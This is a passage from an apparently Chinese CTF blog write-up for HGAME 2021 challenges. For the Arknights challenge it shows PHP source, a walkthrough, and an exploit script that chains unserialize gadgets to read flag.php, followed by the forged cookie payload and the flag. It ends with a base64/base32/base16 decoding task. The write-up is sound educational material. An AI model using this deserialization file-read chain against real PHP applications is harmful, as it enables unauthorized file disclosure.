double-quoted-string\">\"FF0\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"医疗\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">5</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token comment\">//%8</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"玫剑圣\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"近卫\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"不准你休息的驴\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"术士/近卫\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"德克萨斯\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"先锋\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"德克萨斯做得到吗\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"近卫\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span>\n        <span class=\"token number\">6</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token comment\">//%2</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"r4u的女朋友夕\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"术士\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"r4u的老婆年\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"重装\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"花泽香菜\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"重装\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"推王\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"先锋\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"蒂蒂\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"近卫\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"小羊\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"术士\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"银老板\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"近卫\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n\n        <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>index.php:</p>\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">&lt;?php\nerror_reporting(0);\nrequire_once (&quot;simulator.php&quot;);\n$simulator &#x3D; new Simulator();\n$cards &#x3D; array();\nif(isset($_POST[&quot;draw&quot;]))&#123;\n    $cards &#x3D; $simulator-&gt;draw($_POST[&quot;draw&quot;]);\n&#125;\n?&gt;\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n\n&lt;head&gt;\n    &lt;title&gt;Arknights&lt;&#x2F;title&gt;\n    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;\n    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;\n    &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;\n    &lt;link href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;cover.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body class&#x3D;&quot;text-center&quot;&gt;\n    &lt;div class&#x3D;&quot;d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;\n        &lt;header class&#x3D;&quot;mastfoot mt-auto&quot;&gt;\n            &lt;h1&gt;非酋证明器&lt;&#x2F;h1&gt;\n            &lt;br&gt;\n            &lt;br&gt;\n        &lt;&#x2F;header&gt;    \n    &lt;main style&#x3D;&quot;height: 85%&quot;&gt;\n        &lt;div class&#x3D;&quot;card own&quot;&gt;\n            &lt;h5 class&#x3D;&quot;card-header&quot; style&#x3D;&quot;color: blue&quot;&gt;抽中的六星干员&lt;&#x2F;h5&gt;\n            &lt;div class&#x3D;&quot;card-body&quot;&gt;\n                &lt;?php\n                    $legendary &#x3D; $simulator-&gt;getLegendary();\n                    foreach ($legendary as $worker)&#123;\n\n                        echo &quot;&lt;p class&#x3D;&#39;legendary&#39;&gt;&quot;.$worker[&quot;type&quot;].&quot; &quot;.$worker[&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;\n\n                    &#125;\n                ?&gt;\n            &lt;&#x2F;div&gt;\n        &lt;&#x2F;div&gt;\n        &lt;div class&#x3D;&quot;card col-md-3&quot; style&#x3D;&quot;color: #007bff;width&#x3D;100%;&quot;&gt;\n            &lt;h5 class&#x3D;&quot;card-header&quot;&gt;刀客塔，你要老婆不要？&lt;&#x2F;h5&gt;\n            &lt;div class&#x3D;&quot;card-body&quot;&gt;\n                &lt;?php\n                if(!empty($cards))&#123;\n                    echo &quot;&lt;h5 class&#x3D;\\&quot;card-title\\&quot;&gt;抽卡结果：&lt;&#x2F;h5&gt;&quot;;\n                    echo &quot;&lt;br&gt;&quot;;\n                &#125;\n                foreach ($cards as $card)&#123;\n                    switch ($card[&quot;stars&quot;])&#123;\n                        case 3:\n                            echo &quot;&lt;p class&#x3D;&#39;normal&#39;&gt;&quot;.$card[&quot;card&quot;][&quot;star&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;type&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;\n                            break;\n                        case 4:\n                            echo &quot;&lt;p class&#x3D;&#39;rare&#39;&gt;&quot;.$card[&quot;card&quot;][&quot;star&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;type&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;\n                            break;\n                        case 5:\n                            echo &quot;&lt;p class&#x3D;&#39;epic&#39;&gt;&quot;.$card[&quot;card&quot;][&quot;star&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;type&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;\n                            break;\n                        case 6:\n                            echo &quot;&lt;p class&#x3D;&#39;legendary&#39;&gt;&quot;.$card[&quot;card&quot;][&quot;star&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;type&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;\n                            break;\n                    &#125;\n                &#125;\n                ?&gt;\n                &lt;br&gt;\n                &lt;hr&gt;\n                &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;&quot;&gt;\n                    &lt;button class&#x3D;&quot;btn btn-primary&quot; name&#x3D;&quot;draw&quot; value&#x3D;&quot;1&quot;&gt;抽一次&lt;&#x2F;button&gt;\n                    &lt;button class&#x3D;&quot;btn btn-primary&quot; name&#x3D;&quot;draw&quot; value&#x3D;&quot;10&quot;&gt;连连连连连连连连连连!&lt;&#x2F;button&gt;\n                &lt;&#x2F;form&gt;\n            &lt;&#x2F;div&gt;\n        &lt;&#x2F;div&gt;\n\n    &lt;&#x2F;main&gt;\n    &lt;footer class&#x3D;&quot;mastfoot mt-auto&quot;&gt;\n        &lt;p&gt;Made by 109发抽不到&lt;del&gt;老婆&lt;&#x2F;del&gt;夕的&lt;b&gt;R4u&lt;&#x2F;b&gt;.&lt;&#x2F;p&gt;\n    &lt;&#x2F;footer&gt;\n&lt;&#x2F;div&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>首先index.php主要就是包含了simulator.php文件，重点就在simulator.php文件里，pool.php主要是一个英雄池不用管了。simulator.php里看来一遍，可以在Session类的save()和extract()函数处，发现一个存在的序列化和反序列化利用点，并且可以发现Cookie的生成方式,这里就不赘述了，利用反序列的数据也是通过cookie传递。那么接着看看有没有可以被我们利用的其他类，发现了CardsPool类中有一个<code>__toString()</code>方法，方法中使用了<code>file_get_content()</code>函数，这里就可以用于读取文件，而我们的目的就是读取web根目录下的flag.php文件，所以我们这里考虑一下通过触发__toString()的方法。看到最后一个类Eeeeeeevallllllll，它会向屏幕打印信息，所以只要我们把CardsPool对象当作Eeeeeeevallllllll对象的一个成员msg，就可以触发<code>__toString()</code>方法，读取flag.php了。</p>\n<p>exp：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">CardsPool</span>\n<span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cards</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filePath</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filePath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$filePath</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Cards pool file doesn't exist!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">draw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$rand</span> <span class=\"token operator\">=</span> <span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$level</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span> <span class=\"token operator\">>=</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$rand</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">42</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$level</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">elseif</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span> <span class=\"token operator\">>=</span> <span class=\"token number\">43</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$rand</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">90</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$level</span> <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">elseif</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span> <span class=\"token operator\">>=</span> <span class=\"token number\">91</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$rand</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$level</span> <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">elseif</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span> <span class=\"token operator\">==</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$level</span> <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token variable\">$rand_key</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cards</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$level</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n            <span class=\"token string double-quoted-string\">\"stars\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$level</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string double-quoted-string\">\"No\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$rand_key</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string double-quoted-string\">\"card\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cards</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$level</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$rand_key</span><span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cards</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Eeeeeeevallllllll</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"7tH1PKviC9ncELTA1fPysf6NYq7z7IA9\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Eeeeeeevallllllll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">CardsPool</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$se</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$se</span><span class=\"token operator\">.</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$se</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token operator\">.</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">TzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6Mjp7czo1OiJjYXJkcyI7TjtzOjE1OiIAQ2FyZHNQb29sAGZpbGUiO3M6ODoiZmxhZy5waHAiO319.Y2Q1NjAzYWE3MjAxOWEwM2NjOWEwY2ZkNzk0ZmEwNzQ&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>hgame{XI-4Nd-n!AN-D0e5Nt_eX|5T~4t_ALL}</p>\n<h2 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h2><h3 id=\"Base全家福\"><a href=\"#Base全家福\" class=\"headerlink\" title=\"Base全家福\"></a>Base全家福</h3><p>首先解一下base64：</p>\n<p>GY4DMNZWGE3EINRVG5BDKNZWGUZTCNRTGMYDMRBWGU2UMNZUGMYDKRRUHA2DOMZUGRCDGMZVIYZTEMZQGMZDGMJXIQ======</p>\n<p>解base32：</p>\n<p>6867616D657B57653163306D655F74305F4847344D335F323032317D</p>\n<p>解base16：</p>\n<p>hgame{We1c0me_t0_HG4M3_2021}</p>\n","text":"WEBHitchhiking_in_the_Galaxy考点：HTTP头部信息 访问HitchhikerGuide.php，修改访问模式为POST，修改UA为Infinite Improbability Drive，修改Referer为https://cardinal.ink/，...","link":"","photos":[],"count_time":{"symbolsCount":"18k","symbolsTime":"16 mins."},"categories":[{"name":"CTF","slug":"CTF","count":44,"path":"api/categories/CTF.json"}],"tags":[{"name":"HGAME 2021","slug":"HGAME-2021","count":1,"path":"api/tags/HGAME-2021.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#WEB\"><span class=\"toc-text\">WEB</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Hitchhiking-in-the-Galaxy\"><span class=\"toc-text\">Hitchhiking_in_the_Galaxy</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%99%BA%E5%95%86%E6%A3%80%E6%B5%8B%E9%B8%A1\"><span class=\"toc-text\">智商检测鸡</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#watermelon\"><span class=\"toc-text\">watermelon</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Arknights\"><span class=\"toc-text\">Arknights</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Misc\"><span class=\"toc-text\">Misc</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Base%E5%85%A8%E5%AE%B6%E7%A6%8F\"><span class=\"toc-text\">Base全家福</span></a></li></ol></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BUUOJ刷题二月第一周","uid":"5b5f4ff7be54bdec87cb56e0a7ffce00","slug":"BUUOJ刷题二月第一周","date":"2021-02-01T12:31:38.000Z","updated":"2021-06-28T14:58:20.000Z","comments":true,"path":"api/articles/BUUOJ刷题二月第一周.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","text":"[BJDCTF2020]EasySearch考点：SSI注入 直接简单试一试，都是failed，所以使用dirsearch去进行目录扫描，得到一个index.php.swp获取源码。 &lt;?php ob_start(); //加密hash，原文位唯一ID+随机字符(xxxxx...","link":"","photos":[],"count_time":{"symbolsCount":"5.3k","symbolsTime":"5 mins."},"categories":[{"name":"CTF","slug":"CTF","count":44,"path":"api/categories/CTF.json"}],"tags":[{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"BUUOJ刷题1月第五周","uid":"b68352af34123beef3525b42882db0af","slug":"BUUOJ刷题1月第四周","date":"2021-01-29T15:52:22.000Z","updated":"2021-06-28T14:57:56.000Z","comments":true,"path":"api/articles/BUUOJ刷题1月第四周.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","text":"[BSidesCF 2020]Had a bad day考点：PHP伪协议 这题上来就是一个选择，选择的内容是在url处category参数处，输入一个单引号，引发php报错。由此可以知道url传入的参数会先与”.php”进行拼接，然后使用include()来包含。 这里想要直接...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 